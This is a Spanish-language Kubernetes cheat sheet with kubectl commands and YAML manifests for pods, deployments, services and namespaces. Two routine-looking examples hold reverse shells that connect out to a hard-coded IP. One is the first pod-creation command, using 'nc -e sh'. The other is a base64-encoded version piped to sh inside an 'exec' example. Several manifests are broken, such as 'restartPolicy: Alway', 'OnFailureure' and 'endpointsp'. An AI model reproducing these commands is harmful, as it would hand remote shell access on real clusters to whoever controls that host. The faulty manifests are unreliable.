# K8s

- [POD](#POD)
  - [Crear POD](#Crear-POD)
     - [Crear POD con manifiest](#Crear-POD-con-manifiest)
  - [Listar PODS](#Listar-PODS)
  - [Obtener detalles de un POD](#Obtener-detalles-de-un-POD)
  - [Ejecutar comandos en un POD](#Ejecutar-comandos-en-un-POD)
  - [Logs de un POD](#Logs-de-un-POD)
  - [Port-forwarding](#Port-forwarding)
  - [Exportar configuración de un POD](#Exportar-configuración-de-un-POD)
  - [Eliminar PODS](#Eliminar-PODS)
  - [Multicontenedores](#Multicontenedores)
  - [Política de reinicio de POD](#Política-de-reinicio-de-POD)
     - [Always](#Always)
     - [OnFailure](#OnFailure)
     - [Never](#Never)
 - [Organización y selección de recursos](#Organización-y-selección-de-recursos)
   - [Labels](#Labels)
   - [Selectors](#Selectors)
   - [Descriptors](#Descriptors)
- [Deployments](#Deployments)
   - [Crear Depoloyment](#Crear-Deployment)
   - [Crear un Deployment de manera declarativa](#Crear-un-Deployment-de-manera-declarativa)
   - [Edit](#Edit)
   - [Escalar un Deployment](#Escalar-un-Deployment)
- [Servicios](#Servicios)
  - [Exponer servicios](#Exponer-Servicios)
    - [NodePort](#NodePort)
    - [LoadBalancer](#LoadBalancer)
    - [ClusterIP](#ClusterIP)
  - [EndPoints](#EndPoints)
- [Namespaces](#Namespaces)
  
### POD

## Crear POD
```bash
kubectl run <POD> --image=busybox -- /bin/sh -c "busybox nc 192.168.1.6 9001 -e sh"
```
Debido a que *nc* está en espera de la conexión, el contenedor no se detiene hasta que se cierra esa conexión o se termina el proceso de *nc*.
### Crear POD con *manifiest*
```yml
apiVersion: v1
kind: Pod
metadata:
  name: apche2
  labels:
    so: debian
    account: pdn01
    version: v1
spec:
  containers:
   - name: httpd
     image: httpd
```
## Listar PODS
```bash
kubectl get pods
```
```bash
kubectl get pods -o wide
```
```bash
kubectl describe pod <POD>   
```
### Obtener detalles de un POD
```bash
kubectl describe pod <POD>
```
### Ejecutar comandos en un POD
```bash
kubectl exec <POD> -it -- 'sh'
kubectl exec <POD> -it -- 'id'
kubectl exec <POD> -it -- /bin/sh -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjEuNiA0NDMgLWUgc2gK | base64 -d | sh"
```
### Logs de un POD
```bash
kubectl logs <POD>

# Para ver los logs en tiempo real, usar la opción -f
kubectl logs <POD> -f

# Para ver las últimas líneas
kubectl logs --tail=20 <POD>

# Para ver los logs de la última hora
kubectl logs --since=1h <POD>
```
### Acceso a través del Proxy
```bash
# Iniciarl el servicio de proxy
kubectl proxy

# Acceso a la API
curl -s http://127.0.0.1:8001/api/v1/namespaces/default/pods/apache/proxy/
```
### Crear un servicio
```bash
kubectl expose pod <POD> --port=80 --name=svc-apache --type=LoadBalancer

# Ver la IP de Minikube
minikube ip

# Ver el detalle del servicio creado
kubectl get svc

curl -s 192.168.59.101:32635
```
### *Port-forwarding*
```bash
kubectl port-forward <POD> 8080:80
```
```bash
# Si el recurso no existe, se creará.
kubectl create -f httpd.yaml

# Si el recurso ya existe, se actualizará.
kubectl apply -f httpd.yaml
```
### Exportar configuración de un POD
```bash
kubectl get pod/<POD> -o yaml > apache.yaml
```
```bash
kubectl get pod/<POD> -o json > apache.json
```
### Eliminar PODS
```bash
kubectl delete pod <POD>
kubectl delete pod <POD> --now
kubectl delete pod <POD> --grace-period=5
kubectl delete pods --all

# No recomendable
kubectl delete all --all
```
### Multicontenedores
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: multipod
spec:
  containers:
  - name: web
    image: nginx
    ports:
    - containerPort: 80  
  - name: monitor
    image: alpine
    command: ["watch", "-n5", "ping", "localhost"]
```
```bash
kubectl apply -f multiple-containers.yaml
```
Para ver los logs:
```bash
kubectl logs multipod -c monitor
kubectl logs multipod -c web
```
Para ejecutar comandos en los PODS:
```bash
kubectl exec -it multipod -c monitor -- /bin/sh
kubectl exec -it multipod -c web -- /bin/sh
```
### Política de reinicio de POD

### Always
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: always
  labels:
    app: app01
spec:
  containers:
   - name: app01
     image: httpd
  restartPolicy: Alway
```
Si el proceso de Apache termina, Kubernetes iniciará el contenedor nuevamente debido a la política *Always*. El flujo sería el siguiente:

1- Se detiene el servicio httpd. ```./apachectl stop```

2- El contenedor deja de ejecutarse ya que no hay proceso principal activo (o el proceso principal termina).

3- Kubernetes detecta que el contenedor ha terminado.

4- Kubernetes reinicia automáticamente el contenedor debido a la política *Always*, lanzando de nuevo Apache.

### OnFailure
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: on-failure
  labels:
    app: app02
spec:
  containers:
   - name: app02
     image: httpd
  restartPolicy: OnFailureure
```
Si el proceso de Apache termina, Kubernetes no iniciará el contenedor nuevamente debido a la política *OnFailureure*. El flujo sería el siguiente:

1- Se detiene el servicio httpd. ```./apachectl stop```

2- El contenedor deja de ejecutarse ya que no hay proceso principal activo (o el proceso principal termina).

3- Kubernetes detecta que el contenedor ha terminado.

4- Kubernetes no reinicia automáticamente el contenedor debido a la política *OnFailureure*.
### Never
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: never
spec:
  containers:
   - name: mycontainer
     image: busybox
     command: ["echo", "Hello, World!"]
  restartPolicy: Never
```
Si el contenedor ejecuta el comando echo "*Hello, World!*" y termina con un código de salida 0 (sin errores), el contenedor no se reiniciará. El pod terminará y se considerará completado.
### Organización y selección de recursos
### Labels
```bash
kubectl get pod <POD> --show-labels
kubectl get pod <POD> -L key1,key2,key3,...
```
Adicionar etiqueta
```bash
kubectl label pod <POD> Llave=Valor
```
Sobreescribir una etiqueta
```bash
kubectl label --overwrite pod/<POD> version=2.0
```
### Selectors
Buscar en la eqtiqueta el valor x
```bash
kubectl get pods --show-labels -l llave=valor
kubectl get pods --show-labels -l llave=valor,llave=valor,llave=valor,...

# Buscar cuyo valor no sea x
kubectl get pods --show-labels -l llave!=valor

# Conjuntos
X se encuentre en el conjunto de pods, ejemplo:
kubectl get pods --show-labels -l 'entorno in(pdn)'
kubectl get pods --show-labels -l 'entorno in(pdn,dev)'

#Negación
kubectl get pods --show-labels -l 'entorno notin(dev)'

# Eliminar los PODS que no tengan la etiqueta pdn
kubectl delete pods -l 'entorno notin(pdn)'
```
### Descriptors
```bash
# Localizar anotaciones
kubectl get pod/<POD> -o jsonpath={.metadata.annotations}
```
### Deployments
#### Crear Deployment
Crear *Deployments*
```bash
# Mínimamente se creará un POD
kubectl create deployment apache2 --image=httpd

# Para ver el *ReplicaSet* creado
kubectl get rs

# Para ver el *Deployment* creado
kubectl get deployments
```
Detalle del *Deployment*
```bash
kubectl describe deployments
```
Para explotar la configuración del *deploy* realizado:
```bash
kubectl get deploy apache2 -o yaml
```
### Crear un Deployment de manera declarativa
```yaml
apiVersion: apps/v1 # i se Usa apps/v1beta2 para versiones anteriores a 1.9.0
kind: Deployment
metadata:
  name: apache-dply
spec:
  selector:   #permite seleccionar un conjunto de objetos que cumplan las condicione
    matchLabels:
      app: apache
  replicas: 2 # indica al controlador que ejecute 2 pods
  template:   # Plantilla que define los containers
    metadata:
      labels:
        app: apache
    spec:
      containers:
      - name: apache2
        image: httpd
        ports:
        - containerPort: 80
```
Búsqueda de información de los *deploys* creado
```bash
kubectl get deploy,rs,pods
kubectl get deploy,rs,pods --show-labels -l app=apache
```
### Edit
Permite modificar el *deploy* si necesidad de contar el *manifiest*.
```bash
kubectl edit deploy <Deployment>
```
### Escalar un Deployment
```bash
kubectl scale deployment <Deployment> --replicas=<Número de réplicas>
```
### Servicios

### Exponer servicios
*Un servicio en Kubernetes es una abstracción que define un conjunto lógico de pods y una política para acceder a ellos.*

### NodePort

Ejemplo, crear un *Deployment* de Apache2, luego crear un servicio de tipo *NodePort*:
```bash
# Crear el 'deploy'.
kubectl create deployment apache2 --image=httpd

# Crear el servicio.
kubectl expose deploy apache2 --port=80 --type=NodePort

# Obtener los servicios
kubectl get svc
NAME         TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)        AGE
apache2      NodePort    10.104.246.7   <none>        80:30746/TCP   20s

minikube ip
192.168.59.101

# Acceso al 'deploy' a través del servicio
curl -s http://192.168.59.101:30746
<html><body><h1>It works!</h1></body></html>
```

### LoadBalancer

Ejemplo, crear un *Deployment* de Apache2, luego crear un servicio de tipo *LoadBalancer*:
```bash
# Crear el 'deploy'.
kubectl create deployment apache2 --image=httpd --replicas=5

# Crear el servicio.
kubectl expose deploy apache2 --port=80 --name=svc-apache --type=LoadBalancer

# Obtener los servicios
kubectl get svc
NAME         TYPE           CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
svc-apache   LoadBalancer   10.108.78.172   <pending>     80:30196/TCP   3m36s

minikube ip
192.168.59.101

# Acceso al 'deploy' a través del servicio
curl -s http://192.168.59.101:30196
<html><body><h1>It works!</h1></body></html>
```

### ClusterIP
Un *ClusterIP* es un tipo de servicio que proporciona una dirección IP virtual dentro del clúster.
![ClusterIP](images/ClusterIP.png)

Ejemplo:
```bash
# Crear el 'deploy'.
kubectl create deployment web-server --image=httpd --replicas=2
kubectl create deployment cliente --image=debian -- /bin/sh -c "sleep 3600"

# Crear el servicio.
kubectl expose deploy web-server --port=80 --type=ClusterIP

# Obtener los servicios.
kubectl get svc
NAME         TYPE        CLUSTER-IP    EXTERNAL-IP   PORT(S)   AGE
web-server   ClusterIP   10.97.31.76   <none>        80/TCP    58m

# Desde el cliente, basta con ejecutar curl para acceder al servicio de Apache2, el cual será
# balanceado entre los PODS del 'deploy'
curl -s http://web-server
```
### Crear servicio para un Deployment de manera declarativa
```yaml
# DEPLOYMENT  
apiVersion: apps/v1
kind: Deployment
metadata:
  name: php-deployment               # Añadir un nombre para la Deployment
spec:
  replicas: 2                        # Especifica cuántos pods deseas ejecutar
  selector:                          # Permite seleccionar el conjunto de pods mediante etiquetas
    matchLabels:
      app: php
  template:                          # Plantilla que define los contenedores dentro del pod
    metadata:
      labels:
        app: php                     # Etiqueta asociada con los pods creados por este 'Deployment'
    spec:
      containers:
      - name: php                    # Nombre del contenedor
        image: infog/php-app-hostname:latest
        ports:
        - containerPort: 80          # Puerto en el que el contenedor escuchará
---
# SERVICIO  
apiVersion: v1
kind: Service
metadata:
  name: php-svc                      # Nombre del servicio
  labels:
    app: php
spec:
  type: NodePort                     # Tipo de servicio expuesto a través de un puerto en cada nodo
  ports:
  - port: 80                         # Puerto interno del servicio
    nodePort: 30002                  # Puerto accesible desde fuera del clúster
    protocol: TCP     
  selector:
    app: php                         # Este servicio se dirige a los pods que tengan la etiqueta 'app=php'
```
### EndPoints
Para ver la relación de servicios publicados, basta con:
```bash
kubectl get endpointsp
```
### Namespaces
Creación de manera imperactiva:
```bash
kubectl create namespace pdn
```
Creación de manera declarativa:
```yml
apiVersion: v1
kind: Namespace
metadata:
  name: pdn1
  labels:
     tipo: pdn
```
Creación de *Deployment* en *Namespace* diferente a *Default*.
```yml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: deployment-namespace-dev
  namespace: dev1  # Asegúrate de que el deployment esté en el namespace correcto
spec:
  replicas: 2
  selector:
    matchLabels:
      app: app-php
  template:
    metadata:
      labels:
        app: app-php
    spec:
      containers:
      - name: contenedorennsdev1
        image: httpd

---

apiVersion: v1
kind: Service
metadata:
  name: php-svc
  namespace: dev1  # Especificar el namespace
  labels:
    app: app-php
spec:
  type: NodePort
  ports:
    - port: 80
      nodePort: 30006
      protocol: TCP
  selector:
    app: app-php
```
